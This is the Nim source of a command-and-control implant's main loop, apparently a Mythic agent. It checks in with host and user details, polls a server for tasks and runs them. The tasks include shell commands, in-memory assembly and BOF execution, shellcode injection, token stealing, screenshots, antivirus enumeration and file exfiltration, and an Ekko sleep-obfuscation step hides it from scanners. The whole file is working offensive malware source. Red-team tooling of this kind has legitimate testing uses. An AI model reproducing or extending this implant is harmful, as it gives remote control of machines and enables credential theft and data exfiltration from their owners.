import std/[json, random, os, base64, tables, strformat, times]
import config
import profiles/http_profile
import utils/sysinfo
import tasks/exit
import tasks/sleep
import tasks/ls
import tasks/download
import tasks/upload
import tasks/execute_assembly
import tasks/inline_execute
import tasks/powerpick
import tasks/run
import tasks/shinject
import tasks/whoami
import tasks/cat
import tasks/mkdir
import tasks/cp
import tasks/mv
import tasks/cd
import tasks/ps
import tasks/pwd
import tasks/rm
import tasks/token_manager
import tasks/make_token
import tasks/steal_token
import tasks/rev2self

# Windows-only commands
when defined(windows):
  import tasks/screenshot
  import tasks/get_av

# Conditional imports for Windows-only features
when defined(windows):
  import utils/ekko

type
  BackgroundTaskType = enum
    btDownload, btUpload, btExecuteAssembly, btInlineExecute, btShinject
  
  BackgroundTaskState = object
    taskType: BackgroundTaskType
    path: string
    fileId: string
    totalChunks: int
    currentChunk: int
    fileData: seq[byte]  # For execute-assembly file accumulation
    params: JsonNode  # Store original params for execute-assembly
  
  Agent* = ref object
    config: Config
    profile: HttpProfile
    callbackUuid: string
    shouldExit*: bool
    sleepInterval: int
    jitter: int
    taskResponses: seq[JsonNode]
    backgroundTasks: Table[string, BackgroundTaskState]  # taskId -> state

proc newAgent*(): Agent =
  ## Create a new agent instance
  result = Agent()
  result.config = getConfig()
  result.profile = newHttpProfile()
  result.callbackUuid = result.config.uuid  # Initialize with payload UUID
  result.shouldExit = false
  result.sleepInterval = result.config.callbackInterval
  result.jitter = result.config.callbackJitter
  result.taskResponses = @[]
  result.backgroundTasks = initTable[string, BackgroundTaskState]()
  
  # If AESPSK is configured, parse and set it immediately (before checkin)
  if result.config.aesKey.len > 0:
    try:
      # AESPSK is a JSON string like: {"dec_key": "...", "enc_key": "...", "value": "aes256_hmac"}
      let aespskJson = parseJson(result.config.aesKey)
      let encKeyB64 = aespskJson["enc_key"].getStr()
      let decoded = decode(encKeyB64)
      let keyBytes = cast[seq[byte]](decoded)
      result.profile.setAesKey(keyBytes)
      if result.config.debug:
        echo "[DEBUG] AESPSK detected - using pre-shared AES key (no RSA exchange)"
    except:
      if result.config.debug:
        echo "[DEBUG] Failed to parse AESPSK: ", getCurrentExceptionMsg()

proc buildCheckinMessage(): JsonNode =
  ## Build the initial checkin message
  let sysInfo = getSystemInfo()
  let cfg = getConfig()
  
  result = %*{
    "action": "checkin",
    "uuid": cfg.uuid,
    "ips": sysInfo.ips,
    "os": sysInfo.os,
    "user": sysInfo.user,
    "host": sysInfo.hostname,
    "pid": sysInfo.pid,
    "architecture": sysInfo.arch,
    "domain": sysInfo.domain,
    "integrity_level": sysInfo.integrityLevel,
    "process_name": sysInfo.processName,
    "cwd": sysInfo.cwd,
    "impersonation_context": nil
  }
  
proc checkin*(agent: Agent): bool =
  ## Perform initial checkin with Mythic
  if agent.config.debug:
    echo "[DEBUG] Starting checkin..."
  
  # Perform key exchange if enabled AND no AES key is set yet (no AESPSK)
  if agent.config.encryptedExchange and not agent.profile.hasAesKey():
    if not agent.profile.performKeyExchange():
      if agent.config.debug:
        echo "[DEBUG] Key exchange failed"
      return false
  
  # Build and send checkin
  let checkinMsg = buildCheckinMessage()
  let checkinStr = $checkinMsg
  
  if agent.config.debug:
    echo "[DEBUG] Checkin message: ", checkinStr
  
  let response = agent.profile.send(checkinStr, agent.callbackUuid)
  
  if response.len == 0:
    if agent.config.debug:
      echo "[DEBUG] Checkin failed - empty response"
    return false
  
  try:
    let respJson = parseJson(response)
    if respJson.hasKey("status") and respJson["status"].getStr() == "success":
      # Update callback UUID from server response
      let newCallbackUuid = respJson["id"].getStr()
      if agent.config.debug:
        echo "[DEBUG] Checkin successful, updating callback UUID from ", agent.callbackUuid, " to ", newCallbackUuid
      agent.callbackUuid = newCallbackUuid
      return true
  except:
    if agent.config.debug:
      echo "[DEBUG] Failed to parse checkin response: ", getCurrentExceptionMsg()
  
  return false

proc getTasks*(agent: Agent): seq[JsonNode] =
  ## Get tasking from Mythic
  let getTaskingMsg = %*{
    "action": "get_tasking",
    "tasking_size": -1
  }
  
  let response = agent.profile.send($getTaskingMsg, agent.callbackUuid)
  
  if response.len == 0:
    return @[]
  
  var tasks: seq[JsonNode] = @[]
  
  try:
    let respJson = parseJson(response)
    
    if respJson.hasKey("tasks"):
      tasks = respJson["tasks"].getElems()
      if agent.config.debug:
        echo "[DEBUG] Received ", tasks.len, " task(s)"
    
    return tasks
  except:
    if agent.config.debug:
      echo "[DEBUG] Failed to parse tasking: ", getCurrentExceptionMsg()
    return @[]



proc processTasks*(agent: var Agent, tasks: seq[JsonNode]) =
  ## Process received tasks
  for task in tasks:
    let taskId = task["id"].getStr()
    let command = task["command"].getStr()
    
    # Check if this is a background task response (download/upload continuation)
    # These are forwarded to background threads in postResponses(), so skip here
    if command == "background_task":
      if agent.config.debug:
        echo "[DEBUG] Background task message (will be forwarded in postResponses): ", taskId
      continue
    
    # Parse parameters - Mythic sends it as a JSON string
    var params = newJObject()
    if task.hasKey("parameters"):
      let paramStr = task["parameters"].getStr()
      if paramStr.len > 0:
        try:
          params = parseJson(paramStr)
        except:
          if agent.config.debug:
            echo "[DEBUG] Failed to parse parameters: ", paramStr
    
    if agent.config.debug:
      echo "[DEBUG] === PROCESSING TASK ==="
      echo "[DEBUG] Task ID: ", taskId
      echo "[DEBUG] Command: ", command
      if params.len > 0:
        echo "[DEBUG] Parameters: ", params.pretty()
      else:
        echo "[DEBUG] No parameters"
    
    # Execute command and get response
    var response = %*{
      "task_id": taskId,
      "user_output": "Command '" & command & "' not yet implemented",
      "completed": true,
      "status": "error"
    }
    
    try:
      case command
      of "exit":
        if agent.config.debug:
          echo "[DEBUG] Executing exit command"
        response = executeExit(params)
        response["task_id"] = %taskId
        agent.shouldExit = true
        
      of "sleep":
        if agent.config.debug:
          echo "[DEBUG] Executing sleep command"
        response = executeSleep(params, agent.sleepInterval, agent.jitter)
        response["task_id"] = %taskId
        
      of "ls":
        if agent.config.debug:
          echo "[DEBUG] Executing ls command"
        let lsResult = executeLs(params)
        # ls returns file browser format, need to wrap for task response
        if lsResult.hasKey("files"):
          # This is a successful file browser response
          # Mythic expects it in "file_browser" field
          response = %*{
            "task_id": taskId,
            "completed": true,
            "status": "completed",
            "file_browser": lsResult,
            "user_output": $lsResult  # Also include as serialized JSON string
          }
          if agent.config.debug:
            echo "[DEBUG] Ls found ", lsResult["files"].len, " files"
        else:
          # This is an error response, already has user_output
          response = lsResult
          response["task_id"] = %taskId
          if agent.config.debug:
            echo "[DEBUG] Ls returned error: ", lsResult.getOrDefault("user_output")
      
      of "download":
        if agent.config.debug:
          echo "[DEBUG] Starting download"
        response = executeDownload(taskId, params)
        agent.taskResponses.add(response)
        
        # Track as background task for chunk handling
        var state = BackgroundTaskState(
          taskType: btDownload,
          path: params["path"].getStr(),
          fileId: "",  # Will be set when we receive it from Mythic
          totalChunks: response["download"]["total_chunks"].getInt(),
          currentChunk: 0
        )
        agent.backgroundTasks[taskId] = state
        continue
      
      of "upload":
        if agent.config.debug:
          echo "[DEBUG] Starting upload"
        response = executeUpload(taskId, params)
        agent.taskResponses.add(response)
        
        # Track as background task for chunk handling
        var state = BackgroundTaskState(
          taskType: btUpload,
          path: params["remote_path"].getStr(),
          fileId: params["file"].getStr(),
          totalChunks: 0,  # Will be set when we receive first chunk
          currentChunk: 1
        )
        agent.backgroundTasks[taskId] = state
        continue
      
      of "execute_assembly":
        if agent.config.debug:
          echo "[DEBUG] Starting execute-assembly (file download)"
        response = executeAssembly(taskId, params)
        agent.taskResponses.add(response)
        
        # Track as background task for file download
        var state = BackgroundTaskState(
          taskType: btExecuteAssembly,
          path: "",
          fileId: params["uuid"].getStr(),
          totalChunks: 0,  # Will be set when we receive first chunk
          currentChunk: 1,
          fileData: @[],
          params: params
        )
        agent.backgroundTasks[taskId] = state
        continue
      
      of "inline_execute":
        if agent.config.debug:
          echo "[DEBUG] Starting inline_execute (BOF download)"
        response = inlineExecute(taskId, params)
        agent.taskResponses.add(response)
        
        # Track as background task for file download
        var state = BackgroundTaskState(
          taskType: btInlineExecute,
          path: "",
          fileId: params["uuid"].getStr(),
          totalChunks: 0,  # Will be set when we receive first chunk
          currentChunk: 1,
          fileData: @[],
          params: params
        )
        agent.backgroundTasks[taskId] = state
        continue
      
      of "powerpick":
        if agent.config.debug:
          echo "[DEBUG] Executing powerpick command"
        response = powerpick(taskId, params)
        response["task_id"] = %taskId
      
      of "run":
        if agent.config.debug:
          echo "[DEBUG] Executing run command"
        response = run(taskId, params)
        response["task_id"] = %taskId
      
      of "shell":
        if agent.config.debug:
          echo "[DEBUG] Executing shell command (alias for run)"
        response = run(taskId, params)
        response["task_id"] = %taskId
      
      of "shinject":
        if agent.config.debug:
          echo "[DEBUG] Starting shinject (shellcode download)"
        response = shinject(taskId, params)
        agent.taskResponses.add(response)
        
        # Track as background task for file download
        var state = BackgroundTaskState(
          taskType: btShinject,
          path: "",
          fileId: params["uuid"].getStr(),
          totalChunks: 0,
          currentChunk: 1,
          fileData: @[],
          params: params
        )
        agent.backgroundTasks[taskId] = state
        continue
      
      of "whoami":
        if agent.config.debug:
          echo "[DEBUG] Executing whoami command"
        response = whoami(taskId, $params)
      
      of "cat":
        if agent.config.debug:
          echo "[DEBUG] Executing cat command"
        response = catFile(taskId, $params)
      
      of "mkdir":
        if agent.config.debug:
          echo "[DEBUG] Executing mkdir command"
        response = makeDirectory(taskId, $params)
      
      of "cp":
        if agent.config.debug:
          echo "[DEBUG] Executing cp command"
        response = cpFile(taskId, $params)
      
      of "mv":
        if agent.config.debug:
          echo "[DEBUG] Executing mv command"
        response = mvFile(taskId, $params)
      
      of "cd":
        if agent.config.debug:
          echo "[DEBUG] Executing cd command"
        response = changeDirectory(taskId, $params)
      
      of "ps":
        if agent.config.debug:
          echo "[DEBUG] Executing ps command"
        response = ps($params)
        response["task_id"] = %taskId
      
      of "pwd":
        if agent.config.debug:
          echo "[DEBUG] Executing pwd command"
        response = pwd(taskId, params)
      
      of "rm":
        if agent.config.debug:
          echo "[DEBUG] Executing rm command"
        response = rm(taskId, params)
      
      of "make_token":
        if agent.config.debug:
          echo "[DEBUG] Executing make_token command"
        response = makeToken(taskId, params)
      
      of "steal_token":
        if agent.config.debug:
          echo "[DEBUG] Executing steal_token command"
        response = stealToken(taskId, params)
      
      of "rev2self":
        if agent.config.debug:
          echo "[DEBUG] Executing rev2self command"
        response = rev2self(taskId, params)
      
      of "get_av":
        when defined(windows):
          if agent.config.debug:
            echo "[DEBUG] Executing get_av command"
          response = getAv(taskId, params)
        else:
          response = %*{
            "task_id": taskId,
            "completed": true,
            "status": "error",
            "user_output": "get_av command is only available on Windows"
          }
      
      of "screenshot":
        when defined(windows):
          if agent.config.debug:
            echo "[DEBUG] Starting screenshot capture"
          response = screenshot(taskId, params)
          if response.hasKey("download"):
            # This is a background task - store screenshot data for chunking
            agent.taskResponses.add(response)
            
            # Track as background task
            let decodedStr = decode(response["screenshot_data"].getStr())
            var dataBytes = newSeq[byte](decodedStr.len)
            for i in 0..<decodedStr.len:
              dataBytes[i] = decodedStr[i].byte
            
            var state = BackgroundTaskState(
              taskType: btDownload,  # Reuse download for screenshots
              path: "screenshot.bmp",
              fileId: "",
              totalChunks: response["download"]["total_chunks"].getInt(),
              currentChunk: 0,
              fileData: dataBytes
            )
            agent.backgroundTasks[taskId] = state
            response.delete("screenshot_data")  # Don't send raw data to Mythic
            continue
        else:
          # Windows-only command on non-Windows platform
          response = %*{
            "task_id": taskId,
            "user_output": "screenshot command is only available on Windows",
            "completed": true,
            "status": "error"
          }
      
      else:
        # Command not implemented
        if agent.config.debug:
          echo "[DEBUG] Command not implemented: ", command
    
    except Exception as e:
      if agent.config.debug:
        echo "[DEBUG] Task execution error: ", e.msg
      response = %*{
        "task_id": taskId,
        "user_output": "Error executing command: " & e.msg,
        "completed": true,
        "status": "error"
      }
    
    if agent.config.debug:
      if response.hasKey("status"):
        echo "[DEBUG] Task result status: ", response["status"].getStr()
      if response.hasKey("user_output"):
        let output = response["user_output"].getStr()
        if output.len < 200:
          echo "[DEBUG] Task output: ", output
        else:
          echo "[DEBUG] Task output length: ", output.len, " bytes (first 100 chars): ", output[0..<min(100, output.len)]
    
    agent.taskResponses.add(response)

proc postResponses*(agent: var Agent) =
  ## Post task responses back to Mythic
  if agent.taskResponses.len == 0:
    return
  
  if agent.config.debug:
    echo "[DEBUG] === POSTING RESPONSES ==="
    echo "[DEBUG] Posting ", agent.taskResponses.len, " response(s)"
  
  # Separate interactive messages from regular responses
  var postMsg = %*{
    "action": "post_response",
    "responses": agent.taskResponses
  }
  
  let response = agent.profile.send($postMsg, agent.callbackUuid)
  
  if agent.config.debug:
    echo "[DEBUG] Responses posted successfully"
  
  agent.taskResponses = @[]
  
  # Handle background task responses (file_id, chunks, etc.)
  if response.len > 0:
    try:
      let respJson = parseJson(response)
      if respJson.hasKey("responses"):
        for taskResp in respJson["responses"]:
          let taskId = taskResp["task_id"].getStr()
          
          # Check if this response is for a background task
          if agent.backgroundTasks.hasKey(taskId):
            var state = agent.backgroundTasks[taskId]
            
            case state.taskType
            of btDownload:
              # Got file_id, now send chunks
              if state.fileId.len == 0 and taskResp.hasKey("file_id"):
                state.fileId = taskResp["file_id"].getStr()
                agent.backgroundTasks[taskId] = state
                if agent.config.debug:
                  echo "[DEBUG] Download got file_id: ", state.fileId
              
              # Send next chunk
              if state.currentChunk < state.totalChunks:
                state.currentChunk += 1
                
                # Differentiate between file download and screenshot (in-memory data)
                let chunkResp = if state.fileData.len > 0:
                  # Screenshot - process from memory (Windows only)
                  when defined(windows):
                    processScreenshotChunk(taskId, state.fileId, state.fileData, state.currentChunk)
                  else:
                    # Should never happen on non-Windows, but return error
                    %*{"task_id": taskId, "completed": true, "status": "error", "user_output": "Screenshot not supported"}
                else:
                  # File download - read from disk
                  processDownloadChunk(taskId, state.fileId, state.path, state.currentChunk)
                
                agent.taskResponses.add(chunkResp)
                
                # Check if this was the last chunk
                if state.currentChunk >= state.totalChunks:
                  let completeMsg = if state.fileData.len > 0:
                    # Screenshot complete (Windows only)
                    when defined(windows):
                      completeScreenshot(taskId, state.fileId)
                    else:
                      %*{"task_id": taskId, "completed": true, "status": "error", "user_output": "Screenshot not supported"}
                  else:
                    # File download complete
                    completeDownload(taskId, state.fileId, state.path)
                  
                  agent.taskResponses.add(completeMsg)
                  agent.backgroundTasks.del(taskId)
                  if agent.config.debug:
                    let taskType = if state.fileData.len > 0: "Screenshot" else: "Download"
                    echo "[DEBUG] ", taskType, " complete"
                else:
                  agent.backgroundTasks[taskId] = state
            
            of btUpload:
              # Process incoming chunks
              if taskResp.hasKey("chunk_data"):
                let chunkData = taskResp["chunk_data"].getStr()
                let totalChunks = taskResp["total_chunks"].getInt()
                state.totalChunks = totalChunks
                
                let isFirstChunk = (state.currentChunk == 1)
                let uploadResp = processUploadChunk(taskId, state.fileId, state.path, 
                                                     state.currentChunk, chunkData, totalChunks, isFirstChunk)
                agent.taskResponses.add(uploadResp)
                
                if uploadResp.hasKey("completed") and uploadResp["completed"].getBool():
                  agent.backgroundTasks.del(taskId)
                  if agent.config.debug:
                    echo "[DEBUG] Upload complete"
                else:
                  state.currentChunk += 1
                  agent.backgroundTasks[taskId] = state
            
            of btExecuteAssembly:
              # Process incoming file chunks for execute-assembly
              if taskResp.hasKey("chunk_data"):
                let chunkData = taskResp["chunk_data"].getStr()
                let totalChunks = taskResp["total_chunks"].getInt()
                state.totalChunks = totalChunks
                
                # Process the chunk and get next request or final result
                let execResp = processExecuteAssemblyChunk(
                  taskId, state.params, chunkData, totalChunks, 
                  state.currentChunk, state.fileData
                )
                agent.taskResponses.add(execResp)
                
                if execResp.hasKey("completed") and execResp["completed"].getBool():
                  agent.backgroundTasks.del(taskId)
                  if agent.config.debug:
                    echo "[DEBUG] Execute-assembly complete"
                else:
                  state.currentChunk += 1
                  agent.backgroundTasks[taskId] = state
            
            of btInlineExecute:
              # Process incoming file chunks for inline_execute (BOF)
              if taskResp.hasKey("chunk_data"):
                let chunkData = taskResp["chunk_data"].getStr()
                let totalChunks = taskResp["total_chunks"].getInt()
                state.totalChunks = totalChunks
                
                # Process the chunk and get next request or final result
                let bofResp = processInlineExecuteChunk(
                  taskId, state.params, chunkData, totalChunks,
                  state.currentChunk, state.fileData
                )
                agent.taskResponses.add(bofResp)
                
                if bofResp.hasKey("completed") and bofResp["completed"].getBool():
                  agent.backgroundTasks.del(taskId)
                  if agent.config.debug:
                    echo "[DEBUG] Inline_execute complete"
                else:
                  state.currentChunk += 1
                  agent.backgroundTasks[taskId] = state
            
            of btShinject:
              # Process incoming file chunks for shinject
              if taskResp.hasKey("chunk_data"):
                let chunkData = taskResp["chunk_data"].getStr()
                let totalChunks = taskResp["total_chunks"].getInt()
                state.totalChunks = totalChunks
                
                # Process the chunk and get next request or final result
                let injectResp = processShinjectChunk(
                  taskId, state.params, chunkData, totalChunks,
                  state.currentChunk, state.fileData
                )
                agent.taskResponses.add(injectResp)
                
                if injectResp.hasKey("completed") and injectResp["completed"].getBool():
                  agent.backgroundTasks.del(taskId)
                  if agent.config.debug:
                    echo "[DEBUG] Shinject complete"
                else:
                  state.currentChunk += 1
                  agent.backgroundTasks[taskId] = state
    except:
      if agent.config.debug:
        echo "[DEBUG] Failed to parse post_response reply: ", getCurrentExceptionMsg()

proc calculateSleepTime(baseInterval: int, jitterPercent: int): int =
  ## Calculate sleep time with jitter
  ## Works in milliseconds to preserve precision
  if jitterPercent == 0:
    return baseInterval
  
  # Work in milliseconds to avoid integer division precision loss
  let baseMs = baseInterval * 1000
  let jitterMs = rand(-baseMs * jitterPercent .. baseMs * jitterPercent) div 100
  let resultMs = baseMs + jitterMs
  
  # Convert back to seconds
  result = resultMs div 1000
  if result < 1:
    result = 1

proc sleep*(agent: Agent) =
  ## Sleep with jitter
  let sleepTime = calculateSleepTime(agent.sleepInterval, agent.jitter)
  
  if agent.config.debug:
    echo "[DEBUG] Sleeping for ", sleepTime, " seconds (base: ", agent.sleepInterval, 
         "s, jitter: ", agent.jitter, "%)"
  
  # Use Ekko sleep obfuscation if enabled (only for sleeps >= 3 seconds)
  when defined(windows):
    if agent.config.sleepObfuscation == "ekko" and sleepTime >= 3:
      if agent.config.debug:
        echo "[DEBUG] Using Ekko sleep obfuscation"
      ekkoObf(sleepTime * 1000)
    else:
      if agent.config.debug and agent.config.sleepObfuscation == "ekko" and sleepTime < 3:
        echo "[DEBUG] Sleep time < 3s, using regular sleep instead of Ekko"
      os.sleep(sleepTime * 1000)
  else:
    os.sleep(sleepTime * 1000)

proc runAgent*() =
  ## Main agent execution loop - called by all entry points (EXE, DLL, Service)
  ## This is the single source of truth for the agent's main loop logic
  
  # Initialize random number generator for jitter
  randomize()
  
  # Check killdate
  let cfg = getConfig()
  let now = now().format("yyyy-MM-dd")
  if now >= cfg.killdate:
    return
  
  # Initialize agent
  var agentInstance = newAgent()
  
  # Perform initial checkin
  if not agentInstance.checkin():
    return
  
  # Main agent loop
  while not agentInstance.shouldExit:
    # Get tasking from Mythic
    let tasks = agentInstance.getTasks()
    
    # Process tasks
    agentInstance.processTasks(tasks)
    
    # Send responses back (handles background task state machine)
    agentInstance.postResponses()
    
    # Sleep with jitter
    agentInstance.sleep()


